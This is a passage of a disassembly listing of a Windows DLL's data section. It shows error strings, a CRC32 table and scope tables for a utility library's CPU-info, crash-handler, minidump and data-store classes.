					; unknown_libname_5+8o	...
					; Microsoft VisualC 2-10/net runtime
; char aCcpuinfoLoadsi[]
aCcpuinfoLoadsi	db 'CCPUInfo::LoadSignature() : __except (EXCEPTION_EXECUTE_HANDLER)',0Ah
					; DATA XREF: Ordinal545+3Co
		db 0
		align 8
stru_6AF5A088	_SCOPETABLE_ENTRY <0FFFFFFFFh, offset loc_6AF3F3BF, \
					; DATA XREF: Ordinal545+2o
				   offset loc_6AF3F3C3>	; SEH scope table for function 6AF3F38A
		align 8
; char aCcpuinfoLoadfe[]
aCcpuinfoLoadfe	db 'CCPUInfo::LoadFeatures() : __except (EXCEPTION_EXECUTE_HANDLER)',0Ah
					; DATA XREF: Ordinal546+3Co
		db 0
		align 10h
stru_6AF5A0E0	_SCOPETABLE_ENTRY <0FFFFFFFFh, offset loc_6AF3F418, \
					; DATA XREF: Ordinal546+2o
				   offset loc_6AF3F41C>	; SEH scope table for function 6AF3F3E3
; char a04x04x04x04x04[]
a04x04x04x04x04	db '%04X-%04X-%04X-%04X-%04X-%04X',0 ; DATA XREF: Ordinal547+B9o
		align 4
; char aCcpuinfoLoadse[]
aCcpuinfoLoadse	db 'CCPUInfo::LoadSerial() : __except (EXCEPTION_EXECUTE_HANDLER)',0Ah,0
					; DATA XREF: Ordinal547+7Fo
		align 10h
stru_6AF5A150	_SCOPETABLE_ENTRY <0FFFFFFFFh, offset loc_6AF3F4B4, \
					; DATA XREF: Ordinal547+2o
				   offset loc_6AF3F4B8>	; SEH scope table for function 6AF3F43C
; char aCcpuinfoLoadve[]
aCcpuinfoLoadve	db 'CCPUInfo::LoadVendor() : __except (EXCEPTION_EXECUTE_HANDLER)',0Ah,0
					; DATA XREF: Ordinal544+66o
		align 10h
stru_6AF5A1A0	_SCOPETABLE_ENTRY <0FFFFFFFFh, offset loc_6AF3F590, \
					; DATA XREF: Ordinal544+2o
				   offset loc_6AF3F594>	; SEH scope table for function 6AF3F531
; char aCcpuinfoCcpuin[]
aCcpuinfoCcpuin	db 'CCPUInfo::CCPUInfo() : __except (EXCEPTION_EXECUTE_HANDLER)',0Ah,0
					; DATA XREF: Ordinal532+78o
		align 10h
stru_6AF5A1F0	_SCOPETABLE_ENTRY <0FFFFFFFFh, offset loc_6AF3F64D, \
					; DATA XREF: Ordinal532+2o
				   offset loc_6AF3F651>	; SEH scope table for function 6AF3F5DC
off_6AF5A1FC	dd offset sub_6AF3FB16	; DATA XREF: Ordinal548+Fo Ordinal549o
		dd offset Ordinal550
; char aCnewcrashhandl[]
aCnewcrashhandl	db 'CNewCrashHandler::NewHandler() : nSize = %lu',0Ah,0
					; DATA XREF: Ordinal550+7o
		align 4
off_6AF5A234	dd offset sub_6AF3FB32	; DATA XREF: Ordinal551+Fo Ordinal552o
		dd offset Ordinal553
		align 10h
; char aCexceptioncras[]
aCexceptioncras	db 'CExceptionCrashHandler::ExceptionHandler() : ExceptionCode = %lu',0Ah
					; DATA XREF: Ordinal553+Co
		db 0
		align 4
off_6AF5A284	dd offset sub_6AF3FB4E	; DATA XREF: Ordinal554+Fo Ordinal555o
		dd offset Ordinal556
; char aCpurecallcrash[]
aCpurecallcrash	db 'CPurecallCrashHandler::PurecallHandler()',0Ah,0
					; DATA XREF: Ordinal556+1o
		align 4
off_6AF5A2B8	dd offset sub_6AF3FB6A	; DATA XREF: Ordinal557+Fo Ordinal558o
		dd offset Ordinal559
; char aCsecuritycrash[]
aCsecuritycrash	db 'CSecurityCrashHandler::SecurityHandler() : nCode = %d',0Ah,0
					; DATA XREF: Ordinal559+7o
		align 4
off_6AF5A2F8	dd offset sub_6AF3FC92	; DATA XREF: Ordinal561+3o
					; Ordinal560+8o
		dd offset Ordinal564
; char aCcrashhandle_8[]
aCcrashhandle_8	db 'CCrashHandler::Enable() : m_SecurityHandler.Enable() == FALSE',0Ah,0
					; DATA XREF: Ordinal562+215o
		align 10h
aCcrashhandle_7	db 'CCrashHandler::Enable() : m_ExceptionHandler.Enable() == FALSE',0Ah,0
					; DATA XREF: Ordinal562+202o
aCcrashhandle_6	db 'CCrashHandler::Enable() : m_PurecallHandler.Enable() == FALSE',0Ah,0
					; DATA XREF: Ordinal562+1EFo
		align 10h
aCcrashhandle_5	db 'CCrashHandler::Enable() : m_NewHandler.Enable() == FALSE',0Ah,0
					; DATA XREF: Ordinal562+1DCo
		align 4
; char aCcrashhandle_4[]
aCcrashhandle_4	db 'CCrashHandler::Enable() : versionInfo.Load() == FALSE',0Ah,0
					; DATA XREF: Ordinal562+F1o
		align 4
; char aSS_dmp[]
aSS_dmp		db '%s%s.dmp',0         ; DATA XREF: Ordinal562+B9o
		align 10h
aCcrashhandle_3	db 'CCrashHandler::Enable()',0 ; DATA XREF: Ordinal562:loc_6AF3FD34o
; char aCcrashhandle_2[]
aCcrashhandle_2	db 'CCrashHandler::Enable() : path.SplitPath() == FALSE',0Ah,0
					; DATA XREF: Ordinal562+74o
		align 10h
; char aCcrashhandlerE[]
aCcrashhandlerE	db 'CCrashHandler::Enable() : m_DebugHelp.Create() == FALSE',0Ah,0
					; DATA XREF: Ordinal562+4Ao
		align 4
; char aCcrashhandl_12[]
aCcrashhandl_12	db 'CCrashHandler::Dump() : m_DebugHelp.Dump() == FALSE',0Ah,0
					; DATA XREF: Ordinal564+259o
		align 4
aCcrashhandl_11	db 'CCrashHandler::Dump() : m_DebugHelp.Snap() == FALSE',0Ah,0
					; DATA XREF: Ordinal564+23Do
		align 4
; char a04d02d02d02d02[]
a04d02d02d02d02	db '-%04d-%02d-%02d-%02d-%02d-%02d-%03d',0 ; DATA XREF: Ordinal564+146o
; char aS_1[]
aS_1		db '-%s',0              ; DATA XREF: Ordinal564+100o
; char aSS_0[]
aSS_0		db '%s%s',0             ; DATA XREF: Ordinal564+DBo
					; Ordinal679+BEo ...
		align 4
; char aCcrashhandl_10[]
aCcrashhandl_10	db 'CCrashHandler::Dump() : path.SplitPath() == FALSE',0Ah,0
					; DATA XREF: Ordinal564+B0o
		align 10h
aCcrashhandle_9	db 'CCrashHandler::Dump()',0 ; DATA XREF: Ordinal564:loc_6AF3FF9Do
		align 4
; char aCcrashhandlerD[]
aCcrashhandlerD	db 'CCrashHandler::Dump() : eCrashType = %ld, pExceptionInfo = %p',0Ah,0
					; DATA XREF: Ordinal564+4Fo
		align 4
aCcrashhandlerS	db 'CCrashHandler::SetDumpFileName()',0 ; DATA XREF: Ordinal572+30o
		align 10h
dword_6AF5A620	dd 0			; DATA XREF: Ordinal580+19r
		dd 77073096h, 0EE0E612Ch, 990951BAh, 76DC419h, 706AF48Fh
		dd 0E963A535h, 9E6495A3h, 0EDB8832h, 79DCB8A4h,	0E0D5E91Eh
		dd 97D2D988h, 9B64C2Bh,	7EB17CBDh, 0E7B82D07h, 90BF1D91h
		dd 1DB71064h, 6AB020F2h, 0F3B97148h, 84BE41DEh,	1ADAD47Dh
		dd 6DDDE4EBh, 0F4D4B551h, 83D385C7h, 136C9856h,	646BA8C0h
		dd 0FD62F97Ah, 8A65C9ECh, 14015C4Fh, 63066CD9h,	0FA0F3D63h
		dd 8D080DF5h, 3B6E20C8h, 4C69105Eh, 0D56041E4h,	0A2677172h
		dd 3C03E4D1h, 4B04D447h, 0D20D85FDh, 0A50AB56Bh, 35B5A8FAh
		dd 42B2986Ch, 0DBBBC9D6h, 0ACBCF940h, 32D86CE3h, 45DF5C75h
		dd 0DCD60DCFh, 0ABD13D59h, 26D930ACh, 51DE003Ah, 0C8D75180h
		dd 0BFD06116h, 21B4F4B5h, 56B3C423h, 0CFBA9599h, 0B8BDA50Fh
		dd 2802B89Eh, 5F058808h, 0C60CD9B2h, 0B10BE924h, 2F6F7C87h
		dd 58684C11h, 0C1611DABh, 0B6662D3Dh, 76DC4190h, 1DB7106h
		dd 98D220BCh, 0EFD5102Ah, 71B18589h, 6B6B51Fh, 9FBFE4A5h
		dd 0E8B8D433h, 7807C9A2h, 0F00F934h, 9609A88Eh,	0E10E9818h
		dd 7F6A0DBBh, 86D3D2Dh,	91646C97h, 0E6635C01h, 6B6B51F4h
		dd 1C6C6162h, 856530D8h, 0F262004Eh, 6C0695EDh,	1B01A57Bh
		dd 8208F4C1h, 0F50FC457h, 65B0D9C6h, 12B7E950h,	8BBEB8EAh
		dd 0FCB9887Ch, 62DD1DDFh, 15DA2D49h, 8CD37CF3h,	0FBD44C65h
		dd 4DB26158h, 3AB551CEh, 0A3BC0074h, 0D4BB30E2h, 4ADFA541h
		dd 3DD895D7h, 0A4D1C46Dh, 0D3D6F4FBh, 4369E96Ah, 346ED9FCh
		dd 0AD678846h, 0DA60B8D0h, 44042D73h, 33031DE5h, 0AA0A4C5Fh
		dd 0DD0D7CC9h, 5005713Ch, 270241AAh, 0BE0B1010h, 0C90C2086h
		dd 5768B525h, 206F85B3h, 0B966D409h, 0CE61E49Fh, 5EDEF90Eh
		dd 29D9C998h, 0B0D09822h, 0C7D7A8B4h, 59B33D17h, 2EB40D81h
		dd 0B7BD5C3Bh, 0C0BA6CADh, 0EDB88320h, 9ABFB3B6h, 3B6E20Ch
		dd 74B1D29Ah, 0EAD54739h, 9DD277AFh, 4DB2615h, 73DC1683h
		dd 0E3630B12h, 94643B84h, 0D6D6A3Eh, 7A6A5AA8h,	0E40ECF0Bh
		dd 9309FF9Dh, 0A00AE27h, 7D079EB1h, 0F00F9344h,	8708A3D2h
		dd 1E01F268h, 6906C2FEh, 0F762575Dh, 806567CBh,	196C3671h
		dd 6E6B06E7h, 0FED41B76h, 89D32BE0h, 10DA7A5Ah,	67DD4ACCh
		dd 0F9B9DF6Fh, 8EBEEFF9h, 17B7BE43h, 60B08ED5h,	0D6D6A3E8h
		dd 0A1D1937Eh, 38D8C2C4h, 4FDFF252h, 0D1BB67F1h, 0A6BC5767h
		dd 3FB506DDh, 48B2364Bh, 0D80D2BDAh, 0AF0A1B4Ch, 36034AF6h
		dd 41047A60h, 0DF60EFC3h, 0A867DF55h, 316E8EEFh, 4669BE79h
		dd 0CB61B38Ch, 0BC66831Ah, 256FD2A0h, 5268E236h, 0CC0C7795h
		dd 0BB0B4703h, 220216B9h, 5505262Fh, 0C5BA3BBEh, 0B2BD0B28h
		dd 2BB45A92h, 5CB36A04h, 0C2D7FFA7h, 0B5D0CF31h, 2CD99E8Bh
		dd 5BDEAE1Dh, 9B64C2B0h, 0EC63F226h, 756AA39Ch,	26D930Ah
		dd 9C0906A9h, 0EB0E363Fh, 72076785h, 5005713h, 95BF4A82h
		dd 0E2B87A14h, 7BB12BAEh, 0CB61B38h, 92D28E9Bh,	0E5D5BE0Dh
		dd 7CDCEFB7h, 0BDBDF21h, 86D3D2D4h, 0F1D4E242h,	68DDB3F8h
		dd 1FDA836Eh, 81BE16CDh, 0F6B9265Bh, 6FB077E1h,	18B74777h
		dd 88085AE6h, 0FF0F6A70h, 66063BCAh, 11010B5Ch,	8F659EFFh
		dd 0F862AE69h, 616BFFD3h, 166CCF45h, 0A00AE278h, 0D70DD2EEh
		dd 4E048354h, 3903B3C2h, 0A7672661h, 0D06016F7h, 4969474Dh
		dd 3E6E77DBh, 0AED16A4Ah, 0D9D65ADCh, 40DF0B66h, 37D83BF0h
		dd 0A9BCAE53h, 0DEBB9EC5h, 47B2CF7Fh, 30B5FFE9h, 0BDBDF21Ch
		dd 0CABAC28Ah, 53B39330h, 24B4A3A6h, 0BAD03605h, 0CDD70693h
		dd 54DE5729h, 23D967BFh, 0B3667A2Eh, 0C4614AB8h, 5D681B02h
		dd 2A6F2B94h, 0B40BBE37h, 0C30C8EA1h, 5A05DF1Bh, 2D02EF8Dh
; char aCcrc32FileFile[]
aCcrc32FileFile	db 'CCRC32::File() : FileObject.Read() == FALSE',0Ah,0
					; DATA XREF: Ordinal582:loc_6AF403BDo
		align 10h
; char aCcrc32FileFi_0[]
aCcrc32FileFi_0	db 'CCRC32::File() : file.Open() == FALSE',0Ah,0 ; DATA XREF: Ordinal583+30o
		align 4
off_6AF5AA78	dd offset sub_6AF41D7A	; DATA XREF: Ordinal584+7o
					; Ordinal585+3o
		dd offset Ordinal609
		dd offset Ordinal610
		align 8
; char aCdatastoreWr_1[]
aCdatastoreWr_1	db 'CDataStore::WriteHeader() : dwOffset + dwSize > m_dwHeaderSize',0Ah,0
					; DATA XREF: Ordinal595:loc_6AF40538o
; char aCdatastoreWr_0[]
aCdatastoreWr_0	db 'CDataStore::WriteHeader() : m_File.Flush() == FALSE',0Ah,0
					; DATA XREF: Ordinal595+6Bo
		align 10h
; char aCdatastoreWrit[]
aCdatastoreWrit	db 'CDataStore::WriteHeader() : m_File.Write() == FALSE',0Ah,0
					; DATA XREF: Ordinal595+4Do
					; Ordinal613+5Ao
		align 4
; char aCdatastoreRe_0[]
aCdatastoreRe_0	db 'CDataStore::ReadHeader() : dwOffset + dwSize > m_dwHeaderSize',0Ah,0
					; DATA XREF: Ordinal596:loc_6AF405AAo
		align 4
aCdatastoreRead	db 'CDataStore::ReadHeader() : m_File.Read() == FALSE',0Ah,0
					; DATA XREF: Ordinal596+4Ao
					; Ordinal614+7Fo
		align 4
; char aCdatastoreAp_0[]
aCdatastoreAp_0	db 'CDataStore::AppendDataStore() : m_File.Flush() == FALSE',0Ah,0
					; DATA XREF: Ordinal598+A5o
		align 4
; char aCappendstoreAp[]
aCappendstoreAp	db 'CAppendStore::AppendDataStore() : pDataStore->ValidateFile() == F'
					; DATA XREF: Ordinal598+75o
		db 'ALSE',0Ah,0
		align 10h
; char aCdatastoreAppe[]
aCdatastoreAppe	db 'CDataStore::AppendDataStore() : pDataStore == NULL',0Ah,0
					; DATA XREF: Ordinal598+24o
; char aCdatastoreRe_6[]
aCdatastoreRe_6	db 'CDataStore::ReadIndex() : uFileSize < sizeof(HeaderInfo)',0Ah,0
					; DATA XREF: Ordinal611:loc_6AF4098Co
		align 10h
aCdatastoreRe_5	db 'CDataStore::ReadIndex() : Index.m_dwSignature != m_dwIndexSignatu'
					; DATA XREF: Ordinal611:loc_6AF40985o
		db 're',0Ah,0
		align 4
aCdatastoreRe_4	db 'CDataStore::ReadIndex() : Index.m_uIndex != uIndex',0Ah,0
					; DATA XREF: Ordinal611:loc_6AF4097Eo
		align 10h
aCdatastoreRe_3	db 'CDataStore::ReadIndex() : Index.m_dwHeaderCheck != dwHeaderCheck',0Ah
					; DATA XREF: Ordinal611+E3o
		db 0
		align 4
aCdatastoreRe_2	db 'CDataStore::ReadIndex() : m_File.Read() == FALSE',0Ah,0
					; DATA XREF: Ordinal611+B8o
		align 4
aCdatastoreRe_1	db 'CDataStore::ReadIndex() : m_File.GetLength() == FALSE',0Ah,0
					; DATA XREF: Ordinal611+40o
		align 10h
; char aCdatastoreWr_2[]
aCdatastoreWr_2	db 'CDataStore::WriteIndex() : m_File.Write() == FALSE',0Ah,0
					; DATA XREF: Ordinal612+5Do
		align 8
; char aCdatastoreR_11[]
aCdatastoreR_11	db 'CDataStore::ReadHeader() : Header.m_dwSignature != m_dwHeaderSign'
					; DATA XREF: Ordinal614:loc_6AF40B78o
		db 'ature',0Ah,0
aCdatastoreR_10	db 'CDataStore::ReadHeader() : Header.m_uFileSize != uFileSize',0Ah,0
					; DATA XREF: Ordinal614:loc_6AF40B6Co
		align 10h
aCdatastoreRe_9	db 'CDataStore::ReadHeader() : Header.m_dwHeaderCheck != dwHeaderChec'
					; DATA XREF: Ordinal614+A6o
		db 'k',0Ah,0
aCdatastoreRe_8	db 'CDataStore::ReadHeader() : uFileSize < sizeof(HeaderInfo)',0Ah,0
					; DATA XREF: Ordinal614:loc_6AF40AE7o
		align 10h
aCdatastoreRe_7	db 'CDataStore::ReadHeader() : m_File.GetLength() == FALSE',0Ah,0
					; DATA XREF: Ordinal614+40o
; char aCdatastoreR_13[]
aCdatastoreR_13	db 'CDataStore::ReadFirstIndex() : ReadIndex() == FALSE',0Ah,0
					; DATA XREF: Ordinal617+63o
		align 10h
aCdatastoreR_12	db 'CDataStore::ReadFirstIndex() : m_File.GetLength() == FALSE',0Ah,0
					; DATA XREF: Ordinal617+39o
; char aCdatastoreR_15[]
aCdatastoreR_15	db 'CDataStore::ReadNextIndex() : ReadIndex() == FALSE',0Ah,0
					; DATA XREF: Ordinal618+86o
aCdatastoreR_14	db 'CDataStore::ReadNextIndex() : m_File.GetLength() == FALSE',0Ah,0
					; DATA XREF: Ordinal618+48o
		align 4
; char aCdatastoreR_16[]
aCdatastoreR_16	db 'CDataStore::ReadPreviousIndex() : ReadIndex() == FALSE',0Ah,0
					; DATA XREF: Ordinal619+44o
; char aCdatastoreFi_0[]
aCdatastoreFi_0	db 'CDataStore::FindAddIndex() : ReadNextIndex() == FALSE',0Ah,0
					; DATA XREF: Ordinal622:loc_6AF40E1Co
		align 4
; char aCdatastoreFind[]
aCdatastoreFind	db 'CDataStore::FindAddIndex() : ReadFirstIndex() == FALSE',0Ah,0
					; DATA XREF: Ordinal622+88o
aCdatastoreOp_5	db 'CDataStore::Open() : ValidateFile() == FALSE',0Ah,0
					; DATA XREF: Ordinal587+211o
		align 4
aCdatastoreOp_4	db 'CDataStore::Open() : ReadHeader() == FALSE',0Ah,0
					; DATA XREF: Ordinal587:loc_6AF41014o
; char aCdatastoreOp_3[]
aCdatastoreOp_3	db 'CDataStore::Open() : m_File.Write() == FALSE',0Ah,0
					; DATA XREF: Ordinal587:loc_6AF40FF7o
		align 10h
; char aCdatastoreOp_2[]
aCdatastoreOp_2	db 'CDataStore::Open() : WriteHeader() == FALSE',0Ah,0
					; DATA XREF: Ordinal587:loc_6AF40FE0o
		align 10h
aCdatastoreOp_1	db 'CDataStore::Open() : m_File.GetLength() == FALSE',0Ah,0
					; DATA XREF: Ordinal587+DBo
		align 4
aCdatastoreOp_0	db 'CDataStore::Open() : switch(Default)',0Ah,0 ; DATA XREF: Ordinal587+9Eo
		align 4
; char aCdatastoreOpen[]
aCdatastoreOpen	db 'CDataStore::Open() : m_File.Open() == FALSE',0Ah,0
					; DATA XREF: Ordinal587+74o
		align 4
; char aCdatastoreCl_2[]
aCdatastoreCl_2	db 'CDataStore::Close() : m_File.Close() == FALSE',0Ah,0
					; DATA XREF: Ordinal588+CAo
		align 4
; char aCdatastoreCl_1[]
aCdatastoreCl_1	db 'CDataStore::Close() : WriteHeader() == FALSE',0Ah,0
					; DATA XREF: Ordinal588+AEo
		align 4
; char aCdatastoreCl_0[]
aCdatastoreCl_0	db 'CDataStore::Close() : CCRC32::File() == FALSE',0Ah,0
					; DATA XREF: Ordinal588+8Do
		align 4
aCdatastoreClos	db 'CDataStore::Close() : ReadHeader() == FALSE',0Ah,0
					; DATA XREF: Ordinal588+58o
		align 4
; char aCdatastoreClea[]
aCdatastoreClea	db 'CDataStore::Clear() : m_File.SetLength() == FALSE',0Ah,0
					; DATA XREF: Ordinal589+38o
		align 10h
; char aCdatastoreR_22[]
aCdatastoreR_22	db 'CDataStore::Read() : uIndex = 0',0Ah,0
					; DATA XREF: Ordinal592:loc_6AF41284o
		align 4
aCdatastoreR_21	db 'CDataStore::Read() : dwCRC32 != index.m_dwDataCheck',0Ah,0
					; DATA XREF: Ordinal592+C8o
		align 4
aCdatastoreR_20	db 'CDataStore::Read() : m_File.Read() == FALSE',0Ah,0
					; DATA XREF: Ordinal592+A3o
		align 4
aCdatastoreR_19	db 'CDataStore::Read() : dwSize > index.m_dwDataSize',0Ah,0
					; DATA XREF: Ordinal592+79o
		align 10h
aCdatastoreR_18	db 'CDataStore::Read() : index.m_dwDataSize == 0',0Ah,0
					; DATA XREF: Ordinal592+6Ao
		align 10h
aCdatastoreR_17	db 'CDataStore::Read() : ReadIndex() == FALSE',0Ah,0
					; DATA XREF: Ordinal592+5Do
		align 4
aCdatastoreGe_0	db 'CDataStore::GetIndexSize() : ReadIndex() == FALSE',0Ah,0
					; DATA XREF: Ordinal593+58o
		align 10h
; char aCdatastoreGeti[]
aCdatastoreGeti	db 'CDataStore::GetIndexSize() : uIndex = 0',0Ah,0
					; DATA XREF: Ordinal593+2Co
		align 4
; char aCdatastoreGe_1[]
aCdatastoreGe_1	db 'CDataStore::GetStatistics() : ReadNextIndex() == FALSE',0Ah,0
					; DATA XREF: Ordinal607:loc_6AF413D7o
aCdatastoreGets	db 'CDataStore::GetStatistics() : ReadFirstIndex() == FALSE',0Ah,0
					; DATA XREF: Ordinal607+4Ao
		align 10h
; char aCdatastoreVa_6[]
aCdatastoreVa_6	db 'CDataStore::ValidateFile() : ValidateData() == FALSE',0Ah,0
					; DATA XREF: Ordinal609:loc_6AF41598o
					; Ordinal609:loc_6AF415A7o
		align 4
aCdatastoreVa_5	db 'CDataStore::ValidateFile() : Read() == FALSE',0Ah,0
					; DATA XREF: Ordinal609:loc_6AF41591o
		align 4
; char aCdatastoreVa_4[]
aCdatastoreVa_4	db 'CDataStore::ValidateFile() : data.NewAlloc() == FALSE',0Ah,0
					; DATA XREF: Ordinal609:loc_6AF4157Eo
		align 10h
; char aCdatastoreVa_3[]
aCdatastoreVa_3	db 'CDataStore::ValidateFile() : ReadFirstIndex() == FALSE',0Ah,0
					; DATA XREF: Ordinal609+C2o
; char aCdatastoreVa_2[]
aCdatastoreVa_2	db 'CDataStore::ValidateFile() : header.m_dwDataCheck == 0',0Ah,0
					; DATA XREF: Ordinal609:loc_6AF41488o
aCdatastoreVa_1	db 'CDataStore::ValidateFile() : dwCRC32 != header.m_dwDataCheck',0Ah,0
					; DATA XREF: Ordinal609+8Eo
		align 10h
; char aCdatastoreVa_0[]
aCdatastoreVa_0	db 'CDataStore::ValidateFile() : CCRC32::File() == FALSE',0Ah,0
					; DATA XREF: Ordinal609+74o
		align 4
; char aCdatastoreVali[]
aCdatastoreVali	db 'CDataStore::ValidateFile() : ReadHeader() == FALSE',0Ah,0
					; DATA XREF: Ordinal609+2Ao
; char aCdatastoreMe_3[]
aCdatastoreMe_3	db 'CDataStore::MergeEx() : ReadNextIndex() == FALSE',0Ah,0
					; DATA XREF: Ordinal616:loc_6AF418D9o
		align 10h
aCdatastoreMe_2	db 'CDataStore::MergeEx() : m_File.SetLength() == FALSE',0Ah,0
					; DATA XREF: Ordinal616+2F2o
		align 4
aCdatastoreMe_1	db 'CDataStore::MergeEx() : WriteIndex() == FALSE',0Ah,0
					; DATA XREF: Ordinal616:loc_6AF41892o
		align 4
aCdatastoreMe_0	db 'CDataStore::MergeEx() : ReadPreviousIndex() == FALSE',0Ah,0
					; DATA XREF: Ordinal616:loc_6AF4187Co
		align 10h
; char aCdatastoreMerg[]
aCdatastoreMerg	db 'CDataStore::MergeEx() : uBlockSize > DWORD(-1)',0Ah,0
					; DATA XREF: Ordinal616:loc_6AF4166Ao
					; Ordinal616:loc_6AF41705o ...
; char aCdatastoreAp_4[]
aCdatastoreAp_4	db 'CDataStore::AppendData() : WriteIndex() == FALSE',0Ah,0
					; DATA XREF: Ordinal620+12Co
		align 4
; char aCdatastoreAp_3[]
aCdatastoreAp_3	db 'CDataStore::AppendData() : m_File.Flush() == FALSE',0Ah,0
					; DATA XREF: Ordinal620+103o
aCdatastoreAp_2	db 'CDataStore::AppendData() : m_File.GetLength() == FALSE',0Ah,0
					; DATA XREF: Ordinal620+59o
; char aCdatastoreAp_1[]
aCdatastoreAp_1	db 'CDataStore::AppendData() : FindAddIndex() == FALSE',0Ah,0
					; DATA XREF: Ordinal620+27o
; char aCdatastoreAddD[]
aCdatastoreAddD	db 'CDataStore::Add() : dwSize == 0',0Ah,0
					; DATA XREF: Ordinal590:loc_6AF41C46o
		align 4
aCdatastoreAddW	db 'CDataStore::Add() : WriteIndex() == FALSE',0Ah,0
					; DATA XREF: Ordinal590:loc_6AF41C3Fo
		align 4
; char aCdatastoreAddM[]
aCdatastoreAddM	db 'CDataStore::Add() : m_File.Flush() == FALSE',0Ah,0
					; DATA XREF: Ordinal590+195o
		align 4
; char aCdatastoreAddR[]
aCdatastoreAddR	db 'CDataStore::Add() : ReadNextIndex() == FALSE',0Ah,0
					; DATA XREF: Ordinal590+ADo
		align 4
aCdatastoreAddA	db 'CDataStore::Add() : AppendData() == FALSE',0Ah,0
					; DATA XREF: Ordinal590+7Bo
		align 10h
aCdatastoreAddF	db 'CDataStore::Add() : FindAddIndex() == FALSE',0Ah,0
					; DATA XREF: Ordinal590+51o
		align 10h
; char aCdatastoreAp_5[]
aCdatastoreAp_5	db 'CDataStore::AppendDataStore() : appendStore.Open() == FALSE',0Ah,0
					; DATA XREF: Ordinal597+54o
		align 10h
; char aCdatastoreVa_7[]
aCdatastoreVa_7	db 'CDataStore::ValidateData() : m_AppendInfo.m_pDataStore->AppendDat'
					; DATA XREF: Ordinal610+32o
		db 'a() == FALSE',0Ah,0
		align 10h
; char aCdatastoreMe_4[]
aCdatastoreMe_4	db 'CDataStore::Merge() : MergeEx() == FALSE',0Ah,0
					; DATA XREF: Ordinal615+29o
		align 4
; char aCdatastoreDe_4[]
aCdatastoreDe_4	db 'CDataStore::Delete() : m_File.Flush() == FALSE',0Ah,0
					; DATA XREF: Ordinal594+B8o
aCdatastoreDe_3	db 'CDataStore::Delete() : Merge() == FALSE',0Ah,0
					; DATA XREF: Ordinal594+97o
		align 4
aCdatastoreDe_2	db 'CDataStore::Delete() : WriteIndex() == FALSE',0Ah,0
					; DATA XREF: Ordinal594+81o
		align 4
aCdatastoreDe_1	db 'CDataStore::Delete() : Info.m_dwDataSize == 0',0Ah,0
					; DATA XREF: Ordinal594+61o
		align 4
aCdatastoreDe_0	db 'CDataStore::Delete() : ReadIndex() == FALSE',0Ah,0
					; DATA XREF: Ordinal594+55o
		align 4
; char aCdatastoreDele[]
aCdatastoreDele	db 'CDataStore::Delete() : uIndex = 0',0Ah,0 ; DATA XREF: Ordinal594+26o
		align 4
; char aCdatastoreUp_5[]
aCdatastoreUp_5	db 'CDataStore::Update() : dwSize = 0',0Ah,0
					; DATA XREF: Ordinal591:loc_6AF41FD8o
		align 10h
aCdatastoreUp_4	db 'CDataStore::Update() : WriteIndex() == FALSE',0Ah,0
					; DATA XREF: Ordinal591+162o
		align 10h
; char aCdatastoreUp_3[]
aCdatastoreUp_3	db 'CDataStore::Update() : m_File.Flush() == FALSE',0Ah,0
					; DATA XREF: Ordinal591+144o
aCdatastoreUp_2	db 'CDataStore::Update() : Merge() == FALSE',0Ah,0
					; DATA XREF: Ordinal591+11Eo
		align 4
aCdatastoreUp_1	db 'CDataStore::Update() : Add() == FALSE',0Ah,0
					; DATA XREF: Ordinal591:loc_6AF41F1Fo
		align 4
aCdatastoreUp_0	db 'CDataStore::Update() : Info.m_dwDataSize == 0',0Ah,0
					; DATA XREF: Ordinal591+6Do
		align 4
aCdatastoreUpda	db 'CDataStore::Update() : ReadIndex() == FALSE',0Ah,0
					; DATA XREF: Ordinal591+5Eo
		align 4
; char aDDDD[]
aDDDD		db '%d,%d,%d,%d',0      ; DATA XREF: Ordinal623+D4o
; char dword_6AF5BCB0[]
dword_6AF5BCB0	dd 0			; DATA XREF: Ordinal623+ADo
					; Ordinal687+12o ...
; char aClsidBdc678904[]
aClsidBdc678904	db 'CLSID\{bdc67890-4fc0-11d0-a805-00aa006d2ea4}\InstalledVersion',0
					; DATA XREF: Ordinal623+78o
		align 4
off_6AF5BCF4	dd offset unknown_libname_6 ; DATA XREF: Ordinal623+23o
					; Ordinal624o ...
					; Microsoft VisualC 2-10/net runtime
stru_6AF5BCF8	_SCOPETABLE_ENTRY <0FFFFFFFFh, offset loc_6AF4219E, \
					; DATA XREF: sub_6AF42164+2o
				   offset loc_6AF421A2>	; SEH scope table for function 6AF42164
off_6AF5BD04	dd offset sub_6AF425A4	; DATA XREF: Ordinal626+8o
					; Ordinal627+7o
; char Args[]
Args		db 'MiniDumpWriteDump',0 ; DATA XREF: Ordinal631:loc_6AF421E7o
					; Ordinal628+22o ...
		align 4
; char aCdebughelpDu_1[]
aCdebughelpDu_1	db 'CDebugHelp::Dump() : MiniDumpWriteDump() == FALSE, 0x%08X',0Ah,0
					; DATA XREF: Ordinal634+A9o
		align 4
; char aCdebughelpDu_0[]
aCdebughelpDu_0	db 'CDebugHelp::Dump() : dumpFile.Open() == FALSE',0Ah,0
					; DATA XREF: Ordinal634+49o
		align 4
; char aCdebughelpDump[]
aCdebughelpDump	db 'CDebugHelp::Dump() : MiniDumpWriteDump == NULL',0Ah,0
					; DATA XREF: Ordinal634+11o
; char aCdebughelpSnap[]
aCdebughelpSnap	db 'CDebugHelp::Snap() : DumpWithContext() == FALSE',0Ah,0
					; DATA XREF: Ordinal635+15o
		align 4
; char aDbghelp_dll[]
aDbghelp_dll	db 'DBGHELP.DLL',0      ; DATA XREF: Ordinal632+Co
stru_6AF5BDF8	_SCOPETABLE_ENTRY <0FFFFFFFFh, offset loc_6AF4268D, \
					; DATA XREF: Ordinal674+2o
				   offset loc_6AF42691>	; SEH scope table for function 6AF42656
		align 8
stru_6AF5BE08	_SCOPETABLE_ENTRY <0FFFFFFFFh, offset loc_6AF426CD, \
					; DATA XREF: Ordinal675+2o
				   offset loc_6AF426D1>	; SEH scope table for function 6AF426A4
off_6AF5BE14	dd offset sub_6AF427A0	; DATA XREF: Ordinal638+7o
					; Ordinal636+9o ...
		dd offset Ordinal647
		dd offset Ordinal648
; char a0x04x[]
a0x04x		db '0x%04X : ',0        ; DATA XREF: Ordinal640+C0o
					; Ordinal640+DDo
		align 4
; char aS_0[]
aS_0		db '%s : ',0            ; DATA XREF: Ordinal640+A3o
		align 4
; char a04d02d02d02d_0[]
a04d02d02d02d_0	db '%04d-%02d-%02d-%02d-%02d-%02d-%03d : ',0 ; DATA XREF: Ordinal640+84o
		align 4
; char a_log[]
a_log		db '.log',0             ; DATA XREF: Ordinal677:loc_6AF42A8Bo
		align 4
; char a0x04x_0[]
